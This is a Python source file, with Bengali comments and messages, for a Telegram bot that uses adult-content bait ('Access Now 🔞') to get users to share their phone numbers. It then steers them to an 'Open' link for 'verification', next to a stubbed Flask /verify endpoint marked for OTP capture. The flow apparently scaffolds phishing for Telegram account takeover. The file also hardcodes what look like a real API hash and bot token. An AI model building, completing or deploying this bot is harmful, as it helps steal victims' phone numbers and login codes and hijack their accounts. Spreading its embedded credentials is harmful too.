import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, types

# কনফিগারেশন
API_ID = 34278231
API_HASH = '49cf7ab41e479d21a93c150a77c0cf85'
BOT_TOKEN = '7626824489:AAFByXbvcTLUvoavK-CMBKOw9DNf3GpNgQE'

app = Flask(__name__)
CORS(app)

client = TelegramClient('bot_session', API_ID, API_HASH)

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    # ইউজারকে নম্বর শেয়ার করার বাটন পাঠানো
    markup = event.client.build_reply_markup(
        types.KeyboardButtonRequestPhone("Access Now 🔞")
    )
    await event.respond("অ্যাডাল্ট কন্টেন্ট দেখতে আগে নম্বর শেয়ার করুন:", buttons=markup)

@client.on(events.NewMessage)
async def handle_contact(event):
    if event.message.contact:
        # নম্বর পাওয়ার পর ইউজারকে অভিনন্দন জানানো
        await event.respond("ধন্যবাদ! এখন বাম পাশের 'Open' বাটনে ক্লিক করে ভেরিফিকেশন শেষ করুন।")

# ওটিপি ভেরিফিকেশন API অংশ এখানে থাকবে...
@app.route('/verify', methods=['POST'])
async def verify():
    return jsonify({"status": "success"})

if __name__ == "__main__":
    import threading
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))).start()
    client.start(bot_token=BOT_TOKEN)
    client.run_until_disconnected()
